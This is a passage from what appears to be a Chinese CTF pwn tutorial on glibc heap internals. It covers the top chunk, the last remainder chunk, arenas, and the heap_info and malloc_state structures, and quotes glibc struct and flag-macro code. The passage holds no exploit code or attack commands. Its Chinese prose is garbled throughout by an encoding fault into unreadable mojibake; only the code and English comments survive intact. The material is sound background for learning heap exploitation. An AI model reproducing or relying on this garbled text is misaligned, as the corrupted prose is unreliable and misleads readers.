src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA8.png" alt="CTF - PWN_å †ä¸å †æº¢å‡º8.png"></p><p>å¦‚æœä¸€ä¸ª <code>chunk</code> å¤„äº <code>free</code> çŠ¶æ€ï¼Œé‚£ä¹ˆä¼šæœ‰ä¸¤ä¸ªä½ç½®è®°å½•å…¶ç›¸åº”çš„å¤§å°ï¼š</p><ol><li>è¯¥ <code>chunk</code> æœ¬èº«çš„ <code>size</code> å­—æ®µä¼šè®°å½•</li><li>è¯¥ <code>chunk</code> åé¢çš„ä¸€ä¸ª <code>chunk</code> ä¼šè®°å½•</li></ol><blockquote><p>å †ç®¡ç†å™¨ä¼šé€šè¿‡ <code>prev_size</code> å­—æ®µä»¥åŠ <code>size</code> å­—æ®µåˆå¹¶ä¸¤ä¸ªç‰©ç†ç›¸é‚»çš„ç©ºé—² <code>chunk</code> å—</p></blockquote><hr><h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><blockquote><p>ç¨‹åºç¬¬ä¸€æ¬¡è¿›è¡Œ <code>malloc</code> çš„æ—¶å€™ï¼Œ<code>heap</code> ä¼šè¢«åˆ†ä¸ºä¸¤å—ï¼Œä¸€å—ç»™ç”¨æˆ·ï¼Œå‰©ä¸‹çš„é‚£å—å°±æ˜¯ <code>top chunk</code>ï¼Œç®€è€Œè¨€ä¹‹ï¼Œ**<code>top chunk</code> å°±æ˜¯å¤„äºå½“å‰å †çš„ç‰©ç†åœ°å€æœ€é«˜çš„ <code>chunk</code>**</p><p><code>top chunk</code> ä¸å±äºä»»ä½•ä¸€ä¸ª <code>bin</code>ï¼Œå®ƒçš„ä½œç”¨åœ¨äºï¼š  </p><ol><li>å½“æ‰€æœ‰çš„ <code>bin</code> éƒ½æ— æ³•æ»¡è¶³ç”¨æˆ·è¯·æ±‚çš„å¤§å°æ—¶ï¼Œå¦‚æœ <code>top chunk</code> ä¸å°äºç”¨æˆ·è¯·æ±‚çš„å¤§å°ï¼Œå°±ä» <code>top chunk</code> ä¸­è¿›è¡Œåˆ†é…ï¼Œå¹¶å°†å‰©ä¸‹çš„éƒ¨åˆ†ä½œä¸ºæ–°çš„ <code>top chunk</code>  </li><li>å¦åˆ™ï¼Œå°±å¯¹ <code>heap</code> è¿›è¡Œæ‰©å±•åå†è¿›è¡Œåˆ†é…ï¼ˆåœ¨ <code>main arena</code> ä¸­é€šè¿‡ <code>sbrk</code> æ‰©å±• <code>heap</code>ï¼Œè€Œåœ¨ <code>thread arena</code> ä¸­é€šè¿‡ <code>mmap</code> åˆ†é…æ–°çš„ <code>heap</code>ï¼‰</li></ol></blockquote><ul><li>åˆå§‹æƒ…å†µä¸‹ï¼Œå¯ä»¥å°† <code>unsorted chunk</code> ä½œä¸º <code>top chunk</code></li><li><code>top chunk</code> çš„ <code>PREV_INUSE</code> ä½å§‹ç»ˆä¸º 1ï¼ˆå¦åˆ™å…¶å‰é¢çš„ <code>chunk</code> å°±ä¼šè¢«åˆå¹¶åˆ° <code>top chunk</code> ä¸­ï¼‰</li></ul><hr><h4 id="last-remainder-chunk"><a href="#last-remainder-chunk" class="headerlink" title="last remainder chunk"></a>last remainder chunk</h4><blockquote><p>åœ¨ç”¨æˆ·ä½¿ç”¨ <code>malloc</code> è¯·æ±‚åˆ†é…å†…å­˜æ—¶ï¼Œ<code>ptmalloc2</code> æ‰¾åˆ°çš„ <code>chunk</code> å¯èƒ½å¹¶ä¸å’Œç”³è¯·çš„å†…å­˜å¤§å°ä¸€è‡´ï¼Œè¿™æ—¶å€™å°±å°†åˆ†å‰²ä¹‹åçš„å‰©ä½™éƒ¨åˆ†ç§°ä¹‹ä¸º <code>last remainder chunk</code></p></blockquote><ul><li><code>unsorted bin</code> ä¹Ÿä¼šå­˜è¿™ä¸€å—</li><li><code>top chunk</code> åˆ†å‰²å‰©ä¸‹çš„éƒ¨åˆ†ä¸ä¼šä½œä¸º <code>last remainder</code></li></ul><hr><h3 id="å®è§‚ç»“æ„"><a href="#å®è§‚ç»“æ„" class="headerlink" title="å®è§‚ç»“æ„"></a>å®è§‚ç»“æ„</h3><h4 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h4><blockquote><p>æ— è®ºæ˜¯ä¸»çº¿ç¨‹è¿˜æ˜¯æ–°åˆ›å»ºçš„çº¿ç¨‹ï¼Œåœ¨ç¬¬ä¸€æ¬¡ç”³è¯·å†…å­˜æ—¶ï¼Œéƒ½ä¼šæœ‰ç‹¬ç«‹çš„ <code>arena</code>ï¼Œ<code>arena</code> å°±æ˜¯ç”¨æ¥ç®¡ç†çº¿ç¨‹ä¸­çš„è¿™äº›å †çš„ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºå †ç®¡ç†å™¨æ‰€æŒæœ‰çš„å†…å­˜æ± </p></blockquote><ul><li>ä¸€ä¸ªçº¿ç¨‹åªæœ‰ä¸€ä¸ª <code>arnea</code>ï¼Œå¹¶ä¸”è¿™äº›çº¿ç¨‹çš„ <code>arnea</code> éƒ½æ˜¯ç‹¬ç«‹çš„ä¸æ˜¯ç›¸åŒçš„</li></ul><p>ä½†ä¹Ÿä¸æ˜¯æ¯ä¸€ä¸ªçº¿ç¨‹éƒ½ä¼šæœ‰å¯¹åº”çš„ <code>arena</code>ï¼Œå¯¹äºä¸åŒç³»ç»Ÿï¼Œ<code>arena</code> æ•°é‡çš„çº¦æŸå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">For 32 bit systems:     Number of arena = 2 * number of cores.For 64 bit systems:     Number of arena = 8 * number of cores.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºæ¯ä¸ªç³»ç»Ÿçš„æ ¸æ•°æ˜¯æœ‰é™çš„ï¼Œå½“çº¿ç¨‹æ•°å¤§äºæ ¸æ•°çš„äºŒå€ï¼ˆè¶…çº¿ç¨‹æŠ€æœ¯ï¼‰æ—¶ï¼Œå°±å¿…ç„¶æœ‰çº¿ç¨‹å¤„äºç­‰å¾…çŠ¶æ€ï¼Œæ‰€ä»¥æ²¡æœ‰å¿…è¦ä¸ºæ¯ä¸ªçº¿ç¨‹åˆ†é…ä¸€ä¸ª <code>arena</code></p><ul><li>ä¸»çº¿ç¨‹çš„ <code>arnea</code> ç§°ä¸º <code>main_arena</code>ï¼Œå­çº¿ç¨‹çš„ <code>arnea</code> ç§°ä¸º <code>thread_arena</code></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA16.png" alt="CTF - PWN_å †ä¸å †æº¢å‡º16.png"></p><ul><li>ä¸»çº¿ç¨‹æ— è®ºä¸€å¼€å§‹ <code>malloc</code> å¤šå°‘ç©ºé—´ï¼Œåªè¦ <code>size &lt; 128KB</code>ï¼Œ<code>kernel</code> éƒ½ä¼šåˆ†é… <code>132KB</code> å…·æœ‰è¯»å†™æƒé™çš„ <code>heap segment</code>ï¼Œè¿™éƒ¨åˆ†ç§°ä¸º <code>main_arena</code></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA17.png" alt="CTF - PWN_å †ä¸å †æº¢å‡º17.png"></p><p>ä¾‹å¦‚è¿™å¼ å›¾ä¸­ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA2.png" alt="CTF - PWN_å †ä¸å †æº¢å‡º2.png"></p><p><code>heap segment</code> åœ°å€ä¸º <code>0x555555559000 ~ 0x55555557a000</code>ï¼Œå…·æœ‰ <code>rw</code> æƒé™ï¼Œæ€»å…±ï¼š<code>(0x55555557a000 - 0x555555559000)B / 1024 = 132KB</code></p><blockquote><p>æ³¨æ„ï¼š</p><p><code>main_arena</code> å¹¶ä¸åœ¨ç”³è¯·çš„ <code>heap</code> ä¸­ï¼Œè€Œæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œåœ¨ <code>libc.so</code> çš„æ•°æ®æ®µä¸­</p></blockquote><p>åç»­ç”³è¯·çš„å†…å­˜ä¼šä¸€ç›´ä»è¿™ä¸ª <code>arena</code> ä¸­è·å–ï¼Œç›´åˆ°ç©ºé—´ä¸è¶³</p><p>å½“ <code>arena</code> ç©ºé—´ä¸è¶³æ—¶ï¼Œå®ƒå¯ä»¥é€šè¿‡å¢åŠ  <code>brk</code> çš„æ–¹å¼æ¥å¢åŠ å †çš„ç©ºé—´ï¼›ç±»ä¼¼åœ°ï¼Œ<code>arena</code> ä¹Ÿå¯ä»¥é€šè¿‡å‡å° <code>brk</code> æ¥ç¼©å°è‡ªå·±çš„ç©ºé—´</p><p>å³ä½¿å°†æ‰€æœ‰ <code>main_arena</code> æ‰€åˆ†é…å‡ºå»çš„å†…å­˜å— <code>free</code> å®Œï¼Œä¹Ÿä¸ä¼šç«‹å³è¿˜ç»™ <code>kernel</code>ï¼Œè€Œæ˜¯äº¤ç”± Glibc æ¥ç®¡ç†ã€‚å½“åé¢ç¨‹åºå†æ¬¡ç”³è¯·å†…å­˜æ—¶ï¼Œåœ¨ Glibc ä¸­ç®¡ç†çš„å†…å­˜å……è¶³çš„æƒ…å†µä¸‹ï¼ŒGlibc å°±ä¼šæ ¹æ®å †åˆ†é…çš„ç®—æ³•æ¥ç»™ç¨‹åºåˆ†é…ç›¸åº”çš„å†…å­˜</p><hr><h4 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h4><blockquote><p>ç¨‹åºåˆšå¼€å§‹æ‰§è¡Œæ—¶ï¼Œæ¯ä¸ªçº¿ç¨‹æ˜¯æ²¡æœ‰ <code>heap</code> åŒºåŸŸçš„ã€‚å½“å…¶ç”³è¯·å†…å­˜æ—¶ï¼Œå°±éœ€è¦ <code>heap_info</code> è¿™ä¸ªç»“æ„æ¥è®°å½•å¯¹åº”çš„ä¿¡æ¯</p><p>å½“è¯¥ <code>heap</code> çš„èµ„æºè¢«ä½¿ç”¨å®Œåï¼Œå°±å¿…é¡»å¾—å†æ¬¡ç”³è¯·å†…å­˜äº†ã€‚æ­¤å¤–ï¼Œä¸€èˆ¬ç”³è¯·çš„ <code>heap</code> æ˜¯ä¸è¿ç»­çš„ï¼Œå› æ­¤éœ€è¦è®°å½•ä¸åŒ <code>heap</code> ä¹‹é—´çš„é“¾æ¥ç»“æ„</p></blockquote><ul><li><p><strong><code>heap_info</code> è¿™ä¸ªæ•°æ®ç»“æ„æ˜¯ä¸“é—¨ä¸ºä» <code>Memory Mapping Segment</code> å¤„ç”³è¯·çš„å†…å­˜å‡†å¤‡çš„ï¼Œå³ä¸ºéä¸»çº¿ç¨‹å‡†å¤‡çš„</strong></p></li><li><p>ä¸»çº¿ç¨‹å¯ä»¥é€šè¿‡ <code>sbrk()</code> å‡½æ•°æ‰©å±• <code>program break location</code> è·å¾—ï¼ˆç›´åˆ°è§¦åŠ <code>Memory Mapping Segment</code>ï¼‰ï¼Œåªæœ‰ä¸€ä¸ª <code>heap</code>ï¼Œæ²¡æœ‰ <code>heap_info</code> æ•°æ®ç»“æ„</p></li></ul><p><code>heap_info</code> çš„ä¸»è¦ç»“æ„å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">HEAP_MIN_SIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">HEAP_MAX_SIZE</span></span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">ifdef</span> <span class="token expression">DEFAULT_MMAP_THRESHOLD_MAX</span></span><span class="token macro property"><span class="token directive-hash">#</span>  <span class="token directive keyword">define</span> <span class="token macro-name">HEAP_MAX_SIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> DEFAULT_MMAP_THRESHOLD_MAX<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">else</span></span><span class="token macro property"><span class="token directive-hash">#</span>  <span class="token directive keyword">define</span> <span class="token macro-name">HEAP_MAX_SIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">)</span> </span><span class="token comment">/* must be a power of two */</span></span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">endif</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token comment">/* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps   that are dynamically created for multi-threaded programs.  The   maximum size must be a power of two, for fast determination of   which heap belongs to a chunk.  It should be much larger than the   mmap threshold, so that requests with a size just below that   threshold can be fulfilled without creating too many heaps.  */</span><span class="token comment">/***************************************************************************/</span><span class="token comment">/* A heap is a single contiguous memory region holding (coalesceable)   malloc_chunks.  It is allocated with mmap() and always starts at an   address aligned to HEAP_MAX_SIZE.  */</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_heap_info</span><span class="token punctuation">&#123;</span>  mstate ar_ptr<span class="token punctuation">;</span> <span class="token comment">/* Arena for this heap. */</span>  <span class="token keyword">struct</span> <span class="token class-name">_heap_info</span> <span class="token operator">*</span>prev<span class="token punctuation">;</span> <span class="token comment">/* Previous heap. */</span>  size_t size<span class="token punctuation">;</span>   <span class="token comment">/* Current size in bytes. */</span>  size_t mprotect_size<span class="token punctuation">;</span> <span class="token comment">/* Size in bytes that has been mprotected                           PROT_READ|PROT_WRITE.  */</span>  <span class="token comment">/* Make sure the following data is properly aligned, particularly     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of     MALLOC_ALIGNMENT. */</span>  <span class="token keyword">char</span> pad<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span> <span class="token operator">*</span> SIZE_SZ <span class="token operator">&amp;</span> MALLOC_ALIGN_MASK<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> heap_info<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¯¥ç»“æ„ä¸»è¦æ˜¯æè¿°å †çš„åŸºæœ¬ä¿¡æ¯ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li>å †å¯¹åº”çš„ <code>arena</code> çš„åœ°å€</li><li>ç”±äºä¸€ä¸ªçº¿ç¨‹ç”³è¯·ä¸€ä¸ªå †ä¹‹åï¼Œå¯èƒ½ä¼šä½¿ç”¨å®Œï¼Œä¹‹åå°±å¿…é¡»å¾—å†æ¬¡ç”³è¯·ã€‚å› æ­¤ï¼Œä¸€ä¸ªçº¿ç¨‹å¯èƒ½ä¼šæœ‰å¤šä¸ªå †ã€‚<code>prev</code> å³è®°å½•äº†ä¸Šä¸€ä¸ª <code>heap_info</code> çš„åœ°å€ã€‚è¿™é‡Œå¯ä»¥çœ‹åˆ°æ¯ä¸ªå †çš„ <code>heap_info</code> æ˜¯é€šè¿‡å•å‘é“¾è¡¨è¿›è¡Œé“¾æ¥çš„</li><li><code>size</code> è¡¨ç¤ºå½“å‰å †çš„å¤§å°</li><li><code>pad</code> ç¡®ä¿åˆ†é…çš„ç©ºé—´æ˜¯æŒ‰ç…§Â <code>MALLOC_ALIGN_MASK + 1</code>Â å¯¹é½çš„</li></ul><hr><h4 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h4><blockquote><p><code>malloc_state</code> ç»“æ„ç”¨äºç®¡ç†å †ï¼Œè®°å½•æ¯ä¸ª <code>arena</code> å½“å‰ç”³è¯·çš„å†…å­˜çš„å…·ä½“çŠ¶æ€ï¼Œä¾‹å¦‚ï¼šæ˜¯å¦æœ‰ç©ºé—² <code>chunk</code>ï¼Œç©ºé—² <code>chunk</code> çš„å¤§å°ç­‰ç­‰</p></blockquote><ul><li>æ— è®ºæ˜¯ <code>thread_arena</code> è¿˜æ˜¯ <code>main_arena</code>ï¼Œå®ƒä»¬éƒ½åªæœ‰ä¸€ä¸ª <code>malloc state</code> ç»“æ„</li><li>ç”±äº <code>thread</code> çš„ <code>arena</code> å¯èƒ½æœ‰å¤šä¸ªï¼Œ<code>malloc state</code> ç»“æ„ä¼šåœ¨æœ€æ–°ç”³è¯·çš„ <code>arena</code> ä¸­</li></ul><p><code>malloc_state</code> çš„ç»“æ„å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">malloc_state</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/* Serialize access.  */</span>    <span class="token function">__libc_lock_define</span><span class="token punctuation">(</span><span class="token punctuation">,</span> mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Flags (formerly in max_fast).  */</span>    <span class="token keyword">int</span> flags<span class="token punctuation">;</span>    <span class="token comment">/* Fastbins */</span>    mfastbinptr fastbinsY<span class="token punctuation">[</span> NFASTBINS <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span>    mchunkptr top<span class="token punctuation">;</span>    <span class="token comment">/* The remainder from the most recent split of a small request */</span>    mchunkptr last_remainder<span class="token punctuation">;</span>    <span class="token comment">/* Normal bins packed as described above */</span>    mchunkptr bins<span class="token punctuation">[</span> NBINS <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> binmap<span class="token punctuation">[</span> BINMAPSIZE <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* Linked list, points to the next arena */</span>    <span class="token keyword">struct</span> <span class="token class-name">malloc_state</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>    <span class="token comment">/* Linked list for free arenas.  Access to this field is serialized       by free_list_lock in arena.c.  */</span>    <span class="token keyword">struct</span> <span class="token class-name">malloc_state</span> <span class="token operator">*</span>next_free<span class="token punctuation">;</span>    <span class="token comment">/* Number of threads attached to this arena.  0 if the arena is on       the free list.  Access to this field is serialized by       free_list_lock in arena.c.  */</span>    INTERNAL_SIZE_T attached_threads<span class="token punctuation">;</span>    <span class="token comment">/* Memory allocated from the system in this arena.  */</span>    INTERNAL_SIZE_T system_mem<span class="token punctuation">;</span>    INTERNAL_SIZE_T max_system_mem<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>libc_lock_define(, mutex)</code><br>  è¯¥å˜é‡ç”¨äºæ§åˆ¶ç¨‹åºä¸²è¡Œè®¿é—®åŒä¸€ä¸ªåˆ†é…åŒºï¼Œå½“ä¸€ä¸ªçº¿ç¨‹è·å–äº†åˆ†é…åŒºä¹‹åï¼Œå…¶å®ƒçº¿ç¨‹è¦æƒ³è®¿é—®è¯¥åˆ†é…åŒºï¼Œå°±å¿…é¡»ç­‰å¾…è¯¥çº¿ç¨‹åˆ†é…å®Œæˆåæ‰èƒ½å¤Ÿä½¿ç”¨ã€‚</li><li><code>flags</code><br>  <code>flags</code> è®°å½•äº†åˆ†é…åŒºçš„ä¸€äº›æ ‡å¿—ï¼Œæ¯”å¦‚ <code>bit0</code> è®°å½•äº†åˆ†é…åŒºæ˜¯å¦æœ‰ <code>fast bin chunk</code>ï¼Œ<code>bit1</code> æ ‡è¯†åˆ†é…åŒºæ˜¯å¦èƒ½è¿”å›è¿ç»­çš„è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚å…·ä½“å¦‚ä¸‹ï¼š</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/*   FASTCHUNKS_BIT held in max_fast indicates that there are probably   some fastbin chunks. It is set true on entering a chunk into any   fastbin, and cleared only in malloc_consolidate.   The truth value is inverted so that have_fastchunks will be true   upon startup (since statics are zero-filled), simplifying   initialization checks. */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">FASTCHUNKS_BIT</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">1U</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">have_fastchunks</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">&amp;</span> FASTCHUNKS_BIT<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">clear_fastchunks</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token function">catomic_or</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token operator">-></span>flags<span class="token punctuation">,</span> FASTCHUNKS_BIT<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">set_fastchunks</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token function">catomic_and</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token operator">-></span>flags<span class="token punctuation">,</span> <span class="token operator">~</span>FASTCHUNKS_BIT<span class="token punctuation">)</span></span></span><span class="token comment">/*   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous   regions.  Otherwise, contiguity is exploited in merging together,   when possible, results from consecutive MORECORE calls.   The initial value comes from MORECORE_CONTIGUOUS, but is   changed dynamically if mmap is ever used as an sbrk substitute. */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NONCONTIGUOUS_BIT</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">2U</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">contiguous</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">&amp;</span> NONCONTIGUOUS_BIT<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">noncontiguous</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">&amp;</span> NONCONTIGUOUS_BIT<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">set_noncontiguous</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">|=</span> NONCONTIGUOUS_BIT<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">set_contiguous</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">&amp;=</span> <span class="token operator">~</span>NONCONTIGUOUS_BIT<span class="token punctuation">)</span></span></span><span class="token comment">/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the   arena.  Such an arena is no longer used to allocate chunks.  Chunks   allocated in that arena before detecting corruption are not freed.  */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ARENA_CORRUPTION_BIT</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">4U</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">arena_is_corrupt</span><span class="token expression"><span class="token punctuation">(</span>A<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">&amp;</span> ARENA_CORRUPTION_BIT<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">set_arena_corrupt</span><span class="token expression"><span class="token punctuation">(</span>A<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">|=</span> ARENA_CORRUPTION_BIT<span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>fastbinsY[NFASTBINS]</code><br>  å­˜æ”¾æ¯ä¸ª <code>fast chunk</code> é“¾è¡¨å¤´éƒ¨çš„æŒ‡é’ˆ</li><li><code>top</code><br>  æŒ‡å‘åˆ†é…åŒºçš„ <code>top chunk</code></li><li><code>last_reminder</code><br>  æœ€æ–°çš„ <code>chunk</code> åˆ†å‰²ä¹‹åå‰©ä¸‹çš„é‚£éƒ¨åˆ†</li><li><code>bins</code><br>  ç”¨äºå­˜å‚¨ <code>unstored bin</code>ï¼Œ<code>small bin</code> å’Œ <code>large bin</code> çš„ <code>chunk</code> é“¾è¡¨</li><li><code>binmap</code><br>  <code>ptmalloc2</code> ç”¨ 1 ä¸ª <code>bit</code> æ¥æ ‡è¯†æŸä¸€ä¸ª <code>bin</code> ä¸­æ˜¯å¦åŒ…å«ç©ºé—² <code>chunk</code></li></ul><blockquote><p>æ³¨æ„ï¼š</p><p><code>main_arena</code> çš„ <code>malloc_state</code> å¹¶ä¸æ˜¯ <code>heap segment</code> çš„ä¸€éƒ¨åˆ†ï¼Œè€Œæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå­˜å‚¨åœ¨ <code>libc.so</code> çš„æ•°æ®æ®µ</p></blockquote><hr><h2 id="bin-çš„ç§ç±»"><a href="#bin-çš„ç§ç±»" class="headerlink" title="bin çš„ç§ç±»"></a>bin çš„ç§ç±»</h2><blockquote><p>Glibc ä¸ºäº†è®© <code>malloc</code> å¯ä»¥æ›´å¿«æ‰¾åˆ°åˆé€‚å¤§å°çš„ <code>chunk</code>ï¼Œç”¨æˆ· <code>free</code> é‡Šæ”¾æ‰çš„ <code>chunk</code> ä¸ä¼šé©¬ä¸Šå½’è¿˜ç»™ç³»ç»Ÿï¼Œè€Œæ˜¯å°†è¯¥ <code>chunk</code> æ ¹æ®å¤§å°åŠ å…¥åˆ°åˆé€‚çš„ <code>bin</code> ä¸­</p><p>å½“ç”¨æˆ·å†ä¸€æ¬¡é€šè¿‡ <code>malloc</code> è¯·æ±‚åˆ†é…å†…å­˜æ—¶ï¼Œ<code>ptmalloc2</code> ä¼šè¯•å›¾åœ¨ç©ºé—²çš„ <code>chunk</code> ä¸­æŒ‘é€‰ä¸€å—åˆé€‚çš„ç©ºé—´ç»™ç”¨æˆ·ï¼Œè¿™æ ·å¯ä»¥é¿å…é¢‘ç¹çš„ç³»ç»Ÿè°ƒç”¨ï¼Œé™ä½å†…å­˜åˆ†é…çš„å¼€é”€</p><p><mark><code>bin</code> çš„ä¸­æ–‡æ„æ€ä¸ºåƒåœ¾æ¡¶ï¼Œå°±åƒè¦åˆ é™¤çš„æ–‡ä»¶ä¼šå…ˆæ”¾å…¥ Windows çš„å›æ”¶ç«™ä¸€æ ·ä¸ä¼šç«‹å³åˆ é™¤ï¼Œå¾ˆç”ŸåŠ¨å½¢è±¡äº†</mark></p></blockquote><p><code>ptmalloc2</code> 